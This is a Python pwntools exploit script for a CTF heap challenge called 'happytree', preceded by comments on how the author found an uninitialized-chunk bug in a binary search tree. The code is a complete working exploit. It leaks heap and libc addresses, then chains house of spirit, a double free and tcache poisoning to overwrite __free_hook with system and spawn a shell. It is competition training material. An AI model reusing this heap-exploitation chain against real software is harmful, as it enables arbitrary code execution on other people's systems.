#!/usr/bin/env python3

#An elite level heap note challenge from susctf.. And it is first time pwning a C++ challenge..
#And it is a stripped binary too.. So kinda hard to reverse..
#As usual for the heap note challs tried to find out standard heap bugs like Use After Free,Double free
#Heap overflows and even checked for any null byte overflows.. Nothing..
#The chunks are placed in the binary search tree manner which has a root node also branches depending on the values
#There were not any values even in this complex binary search tree ..Tried multiple ways to corrupt the binary search 
#tree nothing worked.. I saw that chunks don't get initialized here when came from bins ..
#So we can get leaks .. So i used it to get both libc and heap leaks..But I still haven't got the bugs to pwn..
#Little did i know that was the bug all along to solve the challenge.. I was struggling literally for a day 
#Untill my teammate volticks from zh3r0 said that he was able to get a write but the problem was the leaks ..
#Which I already have .. His idea was to get a already freed chunk into root node because no initialization occurs..
#The first two quadwords will be overwritten for the root size and the data chunk address but still the branches node
#are not null and we can write our custom pointers to corrupt the memory..
#I suddenly got an idea that it can point to any address 
#but the problem is it the int already present in first quadword on the branch should be free and the value should
#be equal to the heap chunk metadata for the delete chunk .. I am doing the delete on the already freed chunk 
#to create a house of spirit primitive to a double free primitve to finally a tcache poison on the free hook 
#to the address of system function to execute /bin/sh to get a shell.
#After giving this idea to my teammates I started working on the script.. It took me another two hours to get the flag.
#As there were still more problems in the tree structure to overcome and there was also a stack recursion bug that
#kinda segfaults so we have to create the binary search tree in a efficient manner to avoid the segfault..
#But it was a great feeling after pwning this challenge as it was a tough one and also my first C++ chall that too heap based..



from pwn import *

e = ELF("./happytree_patched")
r = process("./happytree_patched")
#r = remote("124.71.147.225",9999)
libc = ELF("./libc.so.6")
def ins(data,content):
    r.sendlineafter(b"cmd>",b"1")
    r.sendlineafter(b"data:",f"{data}")
    r.sendafter(b"content:",content)

def dll(data):
    r.sendlineafter(b"cmd>",b"2")
    r.sendlineafter(b"data:",f"{data}")



def libc_leak(data):
    r.sendlineafter(b"cmd>",b"3")
    r.sendlineafter(b"data:",f"{data}")
    r.recvuntil(b"content: AAAAAAAA")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def heap_leak(data):
    r.sendlineafter(b"cmd>",b"3")
    r.sendlineafter(b"data:",f"{data}")
    r.recvuntil(b"content: ")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak


ins(144,b"A" * 144)
ins(140,b"B" * 140)
ins(148,b"C" * 148)
ins(142,b"D" * 142)
ins(138,b"E" * 138)
ins(146,b"F" * 146)
ins(150,b"G" * 150)
ins(139,b"H" * 139)
ins(10,b"guard")
dll(10)
dll(139)
dll(138)
dll(142)
dll(146)
dll(150)
dll(140)
dll(148)
dll(144)
ins(144,b"\x70")
heap_leak = heap_leak(144)
heap_base = heap_leak - 0x11f70
print(hex(heap_base))
ins(140,b"B" * 140)
ins(148,b"C" * 148)
ins(142,b"D" * 142)
ins(138,b"E" * 138)
ins(146,b"F" * 146)
ins(150,b"G" * 150)
ins(139,b"A" * 8)
libc_base = libc_leak(139) - 0x3ebca0
print(hex(libc_base))
dll(139)
dll(138)
dll(142)
dll(146)
dll(150)
dll(140)
dll(148)
dll(144)
ins(36,b"A" * 8 + p64(heap_base + 0x11f70))
ins(32,b"B" * 16 + p64(0)  + p64(heap_base + 0x124f0))
ins(40,b"C" * 8)
ins(34,b"D" * 34)
ins(30,b"E" * 26)
dll(36)
dll(32)
dll(40)
dll(34)
dll(30)
ins(144,b"/bin/sh\x00")
print(hex(heap_base + 0x12010))
val = hex(heap_base+ 0x12010)
val = int(val[-8:],16)
dll(val)
ins(143,p64(libc_base + libc.sym.__free_hook))
ins(142,b"/bin/sh\x00")
ins(139,p64(libc_base + libc.sym.system))
dll(0)
dll(144)
r.interactive()
